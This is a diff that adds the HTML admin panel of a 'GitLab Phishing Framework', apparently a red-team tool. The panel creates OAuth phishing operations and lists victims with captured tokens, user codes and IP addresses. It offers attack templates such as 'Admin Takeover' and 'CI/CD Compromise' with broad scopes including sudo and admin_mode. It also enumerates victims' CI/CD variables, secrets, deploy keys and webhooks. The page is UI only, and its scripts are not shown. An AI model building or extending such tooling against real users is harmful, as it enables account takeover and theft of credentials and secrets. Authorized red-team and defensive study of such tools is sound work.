@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitLab Phishing Framework - Admin Panel</title>
+    <link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+    <link rel="stylesheet" href="/static/css/admin.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-content">
+                <div class="header-title">
+                    <h1>
+                        <svg viewBox="0 0 210 210" xmlns="http://www.w3.org/2000/svg" style="width: 40px; height: 40px; vertical-align: middle; margin-right: 10px;">
+                            <path fill="#FC6D26" d="M105.0614 207.8797L105.0594 207.8797 105.0614 207.8797z"/>
+                            <path fill="#E24329" d="M105.0614 207.8797L67.8264 95.6547 142.2964 95.6547z"/>
+                            <path fill="#FC6D26" d="M105.0614 207.8797L142.2964 95.6547 194.9014 95.6547z"/>
+                            <path fill="#FCA326" d="M194.9014 95.6547L207.5614 132.8547C208.5614 135.8547 207.5614 139.1547 205.0614 141.0547L105.0614 207.8797z"/>
+                            <path fill="#E24329" d="M194.9014 95.6547L142.2964 95.6547 164.3514 27.8547C165.3514 24.8547 169.5614 24.8547 170.5614 27.8547z"/>
+                            <path fill="#FC6D26" d="M105.0614 207.8797L67.8264 95.6547 15.2214 95.6547z"/>
+                            <path fill="#FCA326" d="M15.2214 95.6547L2.5614 132.8547C1.5614 135.8547 2.5614 139.1547 5.0614 141.0547L105.0614 207.8797z"/>
+                            <path fill="#E24329" d="M15.2214 95.6547L67.8264 95.6547 45.7714 27.8547C44.7714 24.8547 40.5614 24.8547 39.5614 27.8547z"/>
+                        </svg>
+                        GitLab Phishing Framework
+                    </h1>
+                    <p class="subtitle">Admin Control Panel</p>
+                </div>
+                <div class="header-actions">
+                    <button class="btn btn-danger" onclick="showResetDatabaseModal()">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 6px;">
+                            <path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/>
+                        </svg>
+                        Reset Database
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <!-- Global Statistics -->
+        <section class="stats-section">
+            <h2>Global Statistics</h2>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="stat-operations">0</div>
+                    <div class="stat-label">Total Operations</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="stat-active">0</div>
+                    <div class="stat-label">Active Operations</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="stat-victims">0</div>
+                    <div class="stat-label">Total Victims</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="stat-authorized">0</div>
+                    <div class="stat-label">Authorized</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="stat-tokens">0</div>
+                    <div class="stat-label">Tokens Captured</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="stat-projects">0</div>
+                    <div class="stat-label">Projects Found</div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Operations Section -->
+        <section class="operations-section">
+            <div class="section-header">
+                <h2>Operations</h2>
+                <button class="btn btn-primary" onclick="showCreateOperationModal()">+ Create Operation</button>
+            </div>
+            
+            <div class="table-container">
+                <table class="data-table" id="operations-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Name</th>
+                            <th>Instance Type</th>
+                            <th>Base URL</th>
+                            <th>Status</th>
+                            <th>Victims</th>
+                            <th>Tokens</th>
+                            <th>Created</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="operations-tbody">
+                        <tr>
+                            <td colspan="9" class="no-data">No operations yet. Create one to get started.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- Victims Section -->
+        <section class="victims-section">
+            <div class="section-header">
+                <h2>Victims</h2>
+                <select id="victim-filter" onchange="filterVictims()">
+                    <option value="">All Operations</option>
+                </select>
+            </div>
+            
+            <div class="table-container">
+                <table class="data-table" id="victims-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Username</th>
+                            <th>Email</th>
+                            <th>User Code</th>
+                            <th>Status</th>
+                            <th>Token</th>
+                            <th>IP Address</th>
+                            <th>Created</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="victims-tbody">
+                        <tr>
+                            <td colspan="9" class="no-data">No victims yet.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- Activity Log Section -->
+        <section class="activity-section">
+            <div class="section-header">
+                <h2>Activity Log</h2>
+                <select id="activity-filter" onchange="filterActivity()">
+                    <option value="">All Operations</option>
+                </select>
+            </div>
+            
+            <div class="activity-log" id="activity-log">
+                <div class="no-data">No activity yet.</div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Create Operation Modal -->
+    <div id="create-operation-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Create New Operation</h2>
+                <span class="close" onclick="closeCreateOperationModal()">&times;</span>
+            </div>
+            <form id="create-operation-form" onsubmit="createOperation(event)">
+                <div class="form-group">
+                    <label for="op-name">Operation Name *</label>
+                    <input type="text" id="op-name" name="name" required placeholder="e.g., Red Team Exercise 2025">
+                </div>
+                
+                <div class="form-group">
+                    <label for="op-instance-type">Instance Type *</label>
+                    <select id="op-instance-type" name="instance_type" required onchange="toggleBaseUrl()">
+                        <option value="saas">GitLab SaaS (gitlab.com)</option>
+                        <option value="self-managed">Self-Managed Instance</option>
+                    </select>
+                </div>
+                
+                <div class="form-group" id="base-url-group" style="display: none;">
+                    <label for="op-base-url">Base URL *</label>
+                    <input type="url" id="op-base-url" name="base_url" placeholder="https://gitlab.company.com">
+                </div>
+                
+                <div class="form-group">
+                    <label for="op-client-id">Client ID *</label>
+                    <input type="text" id="op-client-id" name="client_id" required placeholder="Your GitLab OAuth Application ID">
+                </div>
+                
+                <div class="form-group">
+                    <label for="op-template">Attack Template</label>
+                    <select id="op-template" name="template" onchange="loadTemplate()">
+                        <option value="">Custom (select scopes manually)</option>
+                        <option value="basic_recon">Basic Recon</option>
+                        <option value="advanced_recon">Advanced Recon</option>
+                        <option value="full_api_access">Full API Access</option>
+                        <option value="admin_takeover">Admin Takeover</option>
+                        <option value="ci_cd_compromise">CI/CD Compromise</option>
+                        <option value="full_access">Full Access</option>
+                    </select>
+                    <small class="template-description" id="template-description"></small>
+                </div>
+                
+                <div class="form-group">
+                    <label>OAuth Scopes *</label>
+                    <div class="scopes-grid">
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="api"> api
+                            <small>Complete read/write access to the API</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="read_api"> read_api
+                            <small>Read-only API access</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="read_user"> read_user
+                            <small>Read user profile information</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="read_repository"> read_repository
+                            <small>Read repositories via Git-over-HTTP</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="write_repository"> write_repository
+                            <small>Write to repositories via Git-over-HTTP</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="read_registry"> read_registry
+                            <small>Read container registry images</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="write_registry"> write_registry
+                            <small>Write to container registry</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="sudo"> sudo
+                            <small>Perform API actions as any user (requires admin)</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="admin_mode"> admin_mode
+                            <small>Enable admin mode for API actions (requires admin)</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="create_runner"> create_runner
+                            <small>Create runners</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="manage_runner"> manage_runner
+                            <small>Manage runners</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="k8s_proxy"> k8s_proxy
+                            <small>Access Kubernetes clusters</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="read_service_ping"> read_service_ping
+                            <small>Read service usage data</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="openid"> openid
+                            <small>Authenticate using OpenID Connect</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="profile"> profile
+                            <small>Access user profile data</small>
+                        </label>
+                        <label class="scope-checkbox">
+                            <input type="checkbox" name="scopes" value="email"> email
+                            <small>Access user email addresses</small>
+                        </label>
+                    </div>
+                </div>
+                
+                <div class="form-actions">
+                    <button type="button" class="btn btn-secondary" onclick="closeCreateOperationModal()">Cancel</button>
+                    <button type="submit" class="btn btn-primary">Create Operation</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Victim Details Modal -->
+    <div id="victim-details-modal" class="modal">
+        <div class="modal-content modal-large">
+            <div class="modal-header">
+                <h2>Victim Details</h2>
+                <span class="close" onclick="closeVictimDetailsModal()">&times;</span>
+            </div>
+            <div id="victim-details-content">
+                <!-- Content loaded dynamically -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Reset Database Modal -->
+    <div id="reset-database-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>⚠️ Reset Database</h2>
+                <span class="close" onclick="closeResetDatabaseModal()">&times;</span>
+            </div>
+            <div style="padding: 25px;">
+                <div style="background: var(--card-bg); border: 2px solid var(--danger-color); border-radius: 8px; padding: 20px; margin-bottom: 20px;">
+                    <h3 style="color: var(--danger-color); margin-bottom: 10px;">⚠️ WARNING: This action cannot be undone!</h3>
+                    <p style="color: var(--text-secondary); margin-bottom: 10px;">Resetting the database will permanently delete:</p>
+                    <ul style="color: var(--text-secondary); margin-left: 20px; line-height: 1.8;">
+                        <li>All operations</li>
+                        <li>All victims and their data</li>
+                        <li>All captured tokens</li>
+                        <li>All enumerated projects</li>
+                        <li>All activity logs</li>
+                    </ul>
+                </div>
+                
+                <p style="color: var(--text-secondary); margin-bottom: 20px;">To confirm, please type <strong style="color: var(--danger-color);">DELETE ALL DATA</strong> below:</p>
+                
+                <input type="text" id="reset-confirmation-input" placeholder="Type DELETE ALL DATA" 
+                       style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px; margin-bottom: 20px;"
+                       oninput="checkResetConfirmation()">
+                
+                <div class="form-actions">
+                    <button type="button" class="btn btn-secondary" onclick="closeResetDatabaseModal()">Cancel</button>
+                    <button type="button" class="btn btn-danger" id="confirm-reset-button" onclick="resetDatabase()" disabled>
+                        Reset Database
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Enumeration Modal -->
+    <div id="enumeration-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>🔍 Enumerate Victim Resources</h2>
+                <span class="close" onclick="closeEnumerationModal()">&times;</span>
+            </div>
+            <form id="enumeration-form" onsubmit="startEnumeration(event)">
+                <div style="padding: 25px;">
+                    <p style="color: var(--text-secondary); margin-bottom: 20px;">Select what you want to enumerate from this victim's GitLab account:</p>
+                    
+                    <div class="form-group">
+                        <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px; padding: 10px; background: var(--card-bg); border-radius: 4px;">
+                            <input type="checkbox" id="enum_all" onchange="toggleAllEnumOptions(this.checked)">
+                            <div>
+                                <strong style="color: var(--primary-color);">Enumerate All</strong>
+                                <small style="display: block; color: var(--text-secondary);">Select all enumeration options</small>
+                            </div>
+                        </label>
+                        
+                        <div style="border-left: 3px solid #404040; padding-left: 15px; margin-left: 10px;">
+                            <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                                <input type="checkbox" name="enum_user" value="true" class="enum-option" checked>
+                                <div>
+                                    <strong>User Information</strong>
+                                    <small style="display: block; color: var(--text-secondary);">Username, email, user ID, and profile details</small>
+                                </div>
+                            </label>
+                            
+                            <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                                <input type="checkbox" name="enum_projects" value="true" class="enum-option" checked>
+                                <div>
+                                    <strong>Projects</strong>
+                                    <small style="display: block; color: var(--text-secondary);">All accessible projects and repositories</small>
+                                </div>
+                            </label>
+                            
+                            <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                                <input type="checkbox" name="enum_groups" value="true" class="enum-option" checked>
+                                <div>
+                                    <strong>Groups</strong>
+                                    <small style="display: block; color: var(--text-secondary);">Group memberships and permissions</small>
+                                </div>
+                            </label>
+                            
+                            <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                                <input type="checkbox" name="enum_snippets" value="true" class="enum-option">
+                                <div>
+                                    <strong>Snippets</strong>
+                                    <small style="display: block; color: var(--text-secondary);">Code snippets and gists</small>
+                                </div>
+                            </label>
+                            
+                            <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                                <input type="checkbox" name="enum_merge_requests" value="true" class="enum-option">
+                                <div>
+                                    <strong>Merge Requests</strong>
+                                    <small style="display: block; color: var(--text-secondary);">All merge requests in accessible projects</small>
+                                </div>
+                            </label>
+                            
+                            <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                                <input type="checkbox" name="enum_issues" value="true" class="enum-option">
+                                <div>
+                                    <strong>Issues</strong>
+                                    <small style="display: block; color: var(--text-secondary);">All issues in accessible projects</small>
+                                </div>
+                            </label>
+                            
+                            <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                                <input type="checkbox" name="enum_ci_variables" value="true" class="enum-option">
+                                <div>
+                                    <strong>CI/CD Variables</strong>
+                                    <small style="display: block; color: var(--text-secondary);">Environment variables and secrets (requires API access)</small>
+                                </div>
+                            </label>
+                            
+                            <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                                <input type="checkbox" name="enum_ssh_keys" value="true" class="enum-option">
+                                <div>
+                                    <strong>Deploy Keys</strong>
+                                    <small style="display: block; color: var(--text-secondary);">SSH deploy keys in projects</small>
+                                </div>
+                            </label>
+                            
+                            <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                                <input type="checkbox" name="enum_webhooks" value="true" class="enum-option">
+                                <div>
+                                    <strong>Webhooks</strong>
+                                    <small style="display: block; color: var(--text-secondary);">Project webhooks and integrations</small>
+                                </div>
+                            </label>
+                            
+                            <label style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                                <input type="checkbox" name="enum_runners" value="true" class="enum-option">
+                                <div>
+                                    <strong>CI/CD Runners</strong>
+                                    <small style="display: block; color: var(--text-secondary);">Available CI/CD runners</small>
+                                </div>
+                            </label>
+                        </div>
+                        
+
+                    </div>
+                    
+                    <div class="form-actions">
+                        <button type="button" class="btn btn-secondary" onclick="closeEnumerationModal()">Cancel</button>
+                        <button type="submit" class="btn btn-primary">Start Enumeration</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Enumeration Progress Modal -->
+    <div id="enumeration-progress-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>🔍 Enumeration in Progress</h2>
+            </div>
+            <div style="padding: 25px;">
+                <div id="enumeration-progress-content">
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="enumeration-progress-bar"></div>
+                    </div>
+                    <div id="enumeration-status" style="margin-top: 20px; color: var(--text-secondary);">
+                        Initializing enumeration...
+                    </div>
+                    <div id="enumeration-log" style="margin-top: 20px; max-height: 300px; overflow-y: auto; background: var(--dark-bg); padding: 15px; border-radius: 6px; font-family: monospace; font-size: 12px;">
+                        <!-- Log entries will be added here -->
+                    </div>
+                </div>
+                <div class="form-actions" style="margin-top: 20px;">
+                    <button type="button" class="btn btn-secondary" id="enumeration-close-button" onclick="closeEnumerationProgressModal()" disabled>
+                        Close
+                    </button>
+                    <button type="button" class="btn btn-primary" id="enumeration-view-results-button" onclick="redirectToEnumerationResults()" style="display: none;">
+                        View Results
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Enumeration Results Modal -->
+    <div id="enumeration-results-modal" class="modal">
+        <div class="modal-content modal-large">
+            <div class="modal-header">
+                <h2>📊 Enumeration Results</h2>
+                <span class="close" onclick="closeEnumerationResultsModal()">&times;</span>
+            </div>
+            <div id="enumeration-results-content" style="padding: 25px;">
+                <!-- Results will be loaded here -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification Toast Container -->
+    <div id="notification-container"></div>
+
+    <script src="/static/js/admin.js"></script>
+    <script src="/static/js/enumeration.js"></script>
+</body>
+</html>
